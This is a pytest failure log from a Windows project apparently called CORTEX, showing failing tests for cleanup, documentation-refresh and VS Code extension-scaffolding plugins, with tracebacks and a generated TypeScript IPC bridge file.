E    +  where 0 = CleanupStats(files_scanned=0, files_deleted=2, files_archived=0, files_compressed=0, files_moved=0, directories_removed=10, duplicates_found=0, space_freed_bytes=32, warnings=['Missing required directory: prompts', 'Missing required directory: workflows'], errors=["Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\file1.bak: 'commit_sha'", "Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\subdir\\file2.old: 'commit_sha'"]).files_scanned
E    +    where CleanupStats(files_scanned=0, files_deleted=2, files_archived=0, files_compressed=0, files_moved=0, directories_removed=10, duplicates_found=0, space_freed_bytes=32, warnings=['Missing required directory: prompts', 'Missing required directory: workflows'], errors=["Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\file1.bak: 'commit_sha'", "Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\subdir\\file2.old: 'commit_sha'"]) = <src.plugins.cleanup_plugin.Plugin object at 0x000001E24E8D7490>.stats
----------------------------- Captured log setup ------------------------------
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:245 Cleanup plugin initialized (dry_run=True)
------------------------------ Captured log call ------------------------------
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:280 Starting full cleanup (dry_run=True)
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:681 Running core file protection verification...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:341 Cleaning temp files...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:374 Cleaning backup files with GitHub archival...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:949 [DRY RUN] Would archive 2 backups to GitHub
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:422 Cleaning cache directories...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:458 Cleaning log files...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:490 Detecting duplicate files...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:525 Cleaning empty directories...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:560 Detecting large files...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:620 Enforcing project structure...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:1042 Checking for bloated documentation to archive...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:1106 No bloated documentation found to archive
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:975 Cleaning up backup archive directory...
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:1025 Backup archive cleanup complete. Kept 0 manifest files for reference.
INFO     src.plugins.cleanup_plugin:cleanup_plugin.py:327 Cleanup complete: 2 files deleted, 0.00MB freed
______________ TestSecurityScanner.test_detect_hardcoded_api_key ______________
tests\plugins\test_code_review_plugin.py:143: in test_detect_hardcoded_api_key
    assert len(secret_violations) == 1
E   assert 0 == 1
E    +  where 0 = len([])
_________ TestSecurityScanner.test_detect_sql_injection_concatenation _________
tests\plugins\test_code_review_plugin.py:159: in test_detect_sql_injection_concatenation
    assert len(sql_violations) == 1
E   assert 0 == 1
E    +  where 0 = len([])
________ TestPlatformSwitchCommands.test_platform_commands_registered _________
tests\plugins\test_command_registry.py:405: in test_platform_commands_registered
    assert len(platform_commands) > 0
E   assert 0 > 0
E    +  where 0 = len([])
__ TestDocRefreshFileCreationProhibition.test_fails_when_file_does_not_exist __
tests\plugins\test_doc_refresh_file_rules.py:41: in test_fails_when_file_does_not_exist
    assert "CRITICAL VIOLATION" in result["error"]
E   assert 'CRITICAL VIOLATION' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
------------------------------ Captured log call ------------------------------
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
__ TestDocRefreshFileCreationProhibition.test_prohibits_quick_read_creation ___
tests\plugins\test_doc_refresh_file_rules.py:70: in test_prohibits_quick_read_creation
    assert "NEVER creates new files" in result["error"]
E   assert 'NEVER creates new files' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
------------------------------ Captured log call ------------------------------
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
_ TestDocRefreshFileCreationProhibition.test_prohibits_summary_variant_creation _
tests\plugins\test_doc_refresh_file_rules.py:79: in test_prohibits_summary_variant_creation
    assert "NEVER creates new files" in result["error"]
E   assert 'NEVER creates new files' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
------------------------------ Captured log call ------------------------------
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
______ TestStoryRefreshCapabilities.test_story_refresh_full_regeneration ______
tests\plugins\test_doc_refresh_plugin.py:189: in test_story_refresh_full_regeneration
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:218 Documentation Refresh Plugin initialized successfully
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
____ TestStoryRefreshCapabilities.test_story_refresh_file_not_exists_error ____
tests\plugins\test_doc_refresh_plugin.py:206: in test_story_refresh_file_not_exists_error
    assert "PROHIBITED" in result["error"]
E   assert 'PROHIBITED' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
------------------------------ Captured log call ------------------------------
ERROR    src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:209 Design directory not found: cortex-brain\cortex-2.0-design
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
_________ TestStoryRefreshCapabilities.test_lab_notebook_condensation _________
tests\plugins\test_doc_refresh_plugin.py:264: in test_lab_notebook_condensation
    assert result["reduction_percentage"] > 50
E   assert -605.6 > 50
------------------------------ Captured log call ------------------------------
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:218 Documentation Refresh Plugin initialized successfully
____________ TestBackupAndSafety.test_no_file_creation_enforcement ____________
tests\plugins\test_doc_refresh_plugin.py:676: in test_no_file_creation_enforcement
    assert "PROHIBITED" in result["error"]
E   assert 'PROHIBITED' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
------------------------------ Captured log call ------------------------------
ERROR    src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:209 Design directory not found: cortex-brain\cortex-2.0-design
INFO     src.plugins.doc_refresh_plugin:doc_refresh_plugin.py:400 Starting story refresh with modular architecture...
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:99 Loading architecture from: cortex-brain\CORTEX-UNIFIED-ARCHITECTURE.yaml
INFO     src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:105 Architecture loaded successfully
ERROR    src.operations.modules.evaluate_cortex_architecture_module:evaluate_cortex_architecture_module.py:180 Failed to evaluate architecture: 'list' object has no attribute 'get'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 108, in execute
    feature_inventory = self._extract_feature_inventory(architecture)
  File "D:\PROJECTS\CORTEX\src\operations\modules\evaluate_cortex_architecture_module.py", line 229, in _extract_feature_inventory
    "capacity": tier1.get('characteristics', {}).get('capacity', ''),
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'list' object has no attribute 'get'
_______ TestExtensionGeneration.test_execute_extension_scaffold_success _______
tests\plugins\test_extension_scaffold_plugin.py:92: in test_execute_extension_scaffold_success
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: test-output
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: test-output\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: test-output\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: test-output\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:840 Generated lifecycleManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:882 Generated checkpointManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:918 Generated externalMonitor.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:991 Generated tokenDashboard.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'test-output\\scripts\\build.sh'
__________ TestExtensionGeneration.test_execute_with_custom_features __________
tests\plugins\test_extension_scaffold_plugin.py:128: in test_execute_with_custom_features
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
_____ TestDirectoryStructureGeneration.test_directory_structure_creation ______
tests\plugins\test_extension_scaffold_plugin.py:152: in test_directory_structure_creation
    assert any("src" in str(p) for p in created_paths)
E   assert False
E    +  where False = any(<generator object TestDirectoryStructureGeneration.test_directory_structure_creation.<locals>.<genexpr> at 0x000001E24EA6DB60>)
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
__________ TestTypeScriptGeneration.test_brain_bridge_ts_generation ___________
tests\plugins\test_extension_scaffold_plugin.py:309: in test_brain_bridge_ts_generation
    assert "IPC" in written_content.lower()
E   assert 'IPC' in "// brain bridge - typescript \u2194 python ipc communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class brainbridge {\n    private pythonprocess: child_process.childprocess | null = null;\n    private ipcclient: any = null;\n    \n    constructor(private context: vscode.extensioncontext) {}\n    \n    async initialize(): promise<void> {\n        console.log('initializing cortex brain bridge...');\n        \n        // get python path from configuration\n        const config = vscode.workspace.getconfiguration('cortex');\n        const pythonpath = config.get<string>('pythonpath', 'python');\n        \n        // get cortex brain path\n        const brainpath = config.get<string>('brainpath', '') || this._detectbrainpath();\n        \n        if (!brainpath) {\n            throw new error('cortex brain path not found. please configure cortex.brainpath');\n        }\n        \n        // start python ipc server\n        const bridgescript = `${brainpath}/src/plugins/extension_bridge.py`;\n        this.pythonprocess = child_process.spawn(pythonpath, [bridgescript]);\n        \n        // setup ipc client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new promise((resolve, reject) => {\n            ipc.connectto('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('connected to cortex brain');\n                    this.ipcclient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: error) => {\n                    console.error('brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async capturemessage(message: any): promise<void> {\n        return this._sendcommand('capture_message', message);\n    }\n    \n    async captureresponse(response: any): promise<void> {\n        return this._sendcommand('capture_response', response);\n    }\n    \n    async routerequest(prompt: string, context: any): promise<any> {\n        return this._sendcommand('route_request', { prompt, context });\n    }\n    \n    async getlastactiveconversation(): promise<any> {\n        return this._sendcommand('get_last_active_conversation', {});\n    }\n    \n    async getconversationhistory(): promise<any[]> {\n        return this._sendcommand('get_conversation_history', {});\n    }\n    \n    async resumeconversation(conversationid: string): promise<void> {\n        return this._sendcommand('resume_conversation', { conversationid });\n    }\n    \n    async clearhistory(): promise<void> {\n        return this._sendcommand('clear_history', {});\n    }\n    \n    async gettokenmetrics(): promise<any> {\n        return this._sendcommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcclient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonprocess) {\n            this.pythonprocess.kill();\n        }\n    }\n    \n    private _sendcommand(command: string, params: any): promise<any> {\n        return new promise((resolve, reject) => {\n            if (!this.ipcclient) {\n                reject(new error('brain bridge not initialized'));\n                return;\n            }\n            \n            const requestid = math.random().tostring(36).substring(7);\n            \n            this.ipcclient.emit('command', {\n                id: requestid,\n                command,\n                params\n            });\n            \n            const timeout = settimeout(() => {\n                reject(new error('command timeout'));\n            }, 30000);\n            \n            this.ipcclient.on(`response_${requestid}`, (response: any) => {\n                cleartimeout(timeout);\n                if (response.error) {\n                    reject(new error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectbrainpath(): string {\n        // try to detect cortex brain path\n        const workspacefolders = vscode.workspace.workspacefolders;\n        if (workspacefolders && workspacefolders.length > 0) {\n            const rootpath = workspacefolders[0].uri.fspath;\n            // check if cortex-brain folder exists\n            if (require('fs').existssync(`${rootpath}/cortex-brain`)) {\n                return rootpath;\n            }\n        }\n        return '';\n    }\n}\n"
E    +  where "// brain bridge - typescript \u2194 python ipc communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class brainbridge {\n    private pythonprocess: child_process.childprocess | null = null;\n    private ipcclient: any = null;\n    \n    constructor(private context: vscode.extensioncontext) {}\n    \n    async initialize(): promise<void> {\n        console.log('initializing cortex brain bridge...');\n        \n        // get python path from configuration\n        const config = vscode.workspace.getconfiguration('cortex');\n        const pythonpath = config.get<string>('pythonpath', 'python');\n        \n        // get cortex brain path\n        const brainpath = config.get<string>('brainpath', '') || this._detectbrainpath();\n        \n        if (!brainpath) {\n            throw new error('cortex brain path not found. please configure cortex.brainpath');\n        }\n        \n        // start python ipc server\n        const bridgescript = `${brainpath}/src/plugins/extension_bridge.py`;\n        this.pythonprocess = child_process.spawn(pythonpath, [bridgescript]);\n        \n        // setup ipc client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new promise((resolve, reject) => {\n            ipc.connectto('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('connected to cortex brain');\n                    this.ipcclient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: error) => {\n                    console.error('brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async capturemessage(message: any): promise<void> {\n        return this._sendcommand('capture_message', message);\n    }\n    \n    async captureresponse(response: any): promise<void> {\n        return this._sendcommand('capture_response', response);\n    }\n    \n    async routerequest(prompt: string, context: any): promise<any> {\n        return this._sendcommand('route_request', { prompt, context });\n    }\n    \n    async getlastactiveconversation(): promise<any> {\n        return this._sendcommand('get_last_active_conversation', {});\n    }\n    \n    async getconversationhistory(): promise<any[]> {\n        return this._sendcommand('get_conversation_history', {});\n    }\n    \n    async resumeconversation(conversationid: string): promise<void> {\n        return this._sendcommand('resume_conversation', { conversationid });\n    }\n    \n    async clearhistory(): promise<void> {\n        return this._sendcommand('clear_history', {});\n    }\n    \n    async gettokenmetrics(): promise<any> {\n        return this._sendcommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcclient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonprocess) {\n            this.pythonprocess.kill();\n        }\n    }\n    \n    private _sendcommand(command: string, params: any): promise<any> {\n        return new promise((resolve, reject) => {\n            if (!this.ipcclient) {\n                reject(new error('brain bridge not initialized'));\n                return;\n            }\n            \n            const requestid = math.random().tostring(36).substring(7);\n            \n            this.ipcclient.emit('command', {\n                id: requestid,\n                command,\n                params\n            });\n            \n            const timeout = settimeout(() => {\n                reject(new error('command timeout'));\n            }, 30000);\n            \n            this.ipcclient.on(`response_${requestid}`, (response: any) => {\n                cleartimeout(timeout);\n                if (response.error) {\n                    reject(new error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectbrainpath(): string {\n        // try to detect cortex brain path\n        const workspacefolders = vscode.workspace.workspacefolders;\n        if (workspacefolders && workspacefolders.length > 0) {\n            const rootpath = workspacefolders[0].uri.fspath;\n            // check if cortex-brain folder exists\n            if (require('fs').existssync(`${rootpath}/cortex-brain`)) {\n                return rootpath;\n            }\n        }\n        return '';\n    }\n}\n" = <built-in method lower of str object at 0x000001E23CC50FE0>()
E    +    where <built-in method lower of str object at 0x000001E23CC50FE0> = "// Brain bridge - TypeScript \u2194 Python IPC communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class BrainBridge {\n    private pythonProcess: child_process.ChildProcess | null = null;\n    private ipcClient: any = null;\n    \n    constructor(private context: vscode.ExtensionContext) {}\n    \n    async initialize(): Promise<void> {\n        console.log('Initializing CORTEX brain bridge...');\n        \n        // Get Python path from configuration\n        const config = vscode.workspace.getConfiguration('cortex');\n        const pythonPath = config.get<string>('pythonPath', 'python');\n        \n        // Get CORTEX brain path\n        const brainPath = config.get<string>('brainPath', '') || this._detectBrainPath();\n        \n        if (!brainPath) {\n            throw new Error('CORTEX brain path not found. Please configure cortex.brainPath');\n        }\n        \n        // Start Python IPC server\n        const bridgeScript = `${brainPath}/src/plugins/extension_bridge.py`;\n        this.pythonProcess = child_process.spawn(pythonPath, [bridgeScript]);\n        \n        // Setup IPC client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new Promise((resolve, reject) => {\n            ipc.connectTo('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('Connected to CORTEX brain');\n                    this.ipcClient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: Error) => {\n                    console.error('Brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async captureMessage(message: any): Promise<void> {\n        return this._sendCommand('capture_message', message);\n    }\n    \n    async captureResponse(response: any): Promise<void> {\n        return this._sendCommand('capture_response', response);\n    }\n    \n    async routeRequest(prompt: string, context: any): Promise<any> {\n        return this._sendCommand('route_request', { prompt, context });\n    }\n    \n    async getLastActiveConversation(): Promise<any> {\n        return this._sendCommand('get_last_active_conversation', {});\n    }\n    \n    async getConversationHistory(): Promise<any[]> {\n        return this._sendCommand('get_conversation_history', {});\n    }\n    \n    async resumeConversation(conversationId: string): Promise<void> {\n        return this._sendCommand('resume_conversation', { conversationId });\n    }\n    \n    async clearHistory(): Promise<void> {\n        return this._sendCommand('clear_history', {});\n    }\n    \n    async getTokenMetrics(): Promise<any> {\n        return this._sendCommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcClient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonProcess) {\n            this.pythonProcess.kill();\n        }\n    }\n    \n    private _sendCommand(command: string, params: any): Promise<any> {\n        return new Promise((resolve, reject) => {\n            if (!this.ipcClient) {\n                reject(new Error('Brain bridge not initialized'));\n                return;\n            }\n            \n            const requestId = Math.random().toString(36).substring(7);\n            \n            this.ipcClient.emit('command', {\n                id: requestId,\n                command,\n                params\n            });\n            \n            const timeout = setTimeout(() => {\n                reject(new Error('Command timeout'));\n            }, 30000);\n            \n            this.ipcClient.on(`response_${requestId}`, (response: any) => {\n                clearTimeout(timeout);\n                if (response.error) {\n                    reject(new Error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectBrainPath(): string {\n        // Try to detect CORTEX brain path\n        const workspaceFolders = vscode.workspace.workspaceFolders;\n        if (workspaceFolders && workspaceFolders.length > 0) {\n            const rootPath = workspaceFolders[0].uri.fsPath;\n            // Check if cortex-brain folder exists\n            if (require('fs').existsSync(`${rootPath}/cortex-brain`)) {\n                return rootPath;\n            }\n        }\n        return '';\n    }\n}\n".lower
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
__________________ TestFeatureToggling.test_minimal_features __________________
tests\plugins\test_extension_scaffold_plugin.py:492: in test_minimal_features
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
___________________ TestFeatureToggling.test_full_features ____________________
tests\plugins\test_extension_scaffold_plugin.py:520: in test_full_features
    assert result["success"] is True
E   assert False is True
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:840 Generated lifecycleManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:882 Generated checkpointManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:918 Generated externalMonitor.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:991 Generated tokenDashboard.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1151 Generated extension_bridge.py
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:1237 Generated test files
ERROR    plugin.extension_scaffold:extension_scaffold_plugin.py:191 Error scaffolding extension: [WinError 3] The system cannot find the path specified: 'cortex-extension\\scripts\\build.sh'
_____________ TestErrorHandling.test_execute_with_missing_context _____________
tests\plugins\test_extension_scaffold_plugin.py:559: in test_execute_with_missing_context
    assert result["extension_name"] == "cortex"
           ^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'extension_name'
------------------------------ Captured log call ------------------------------
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:106 Extension Scaffold Plugin initialized
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:143 Generating extension at: cortex-extension
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:388 Generated package.json at: cortex-extension\package.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:413 Generated tsconfig.json at: cortex-extension\tsconfig.json
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:550 Generated extension.ts at: cortex-extension\src\extension.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:660 Generated chatParticipant.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:806 Generated brainBridge.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:840 Generated lifecycleManager.ts
INFO     plugin.extension_scaffold:extension_scaffold_plugin.py:882 Generated checkpointManager.ts
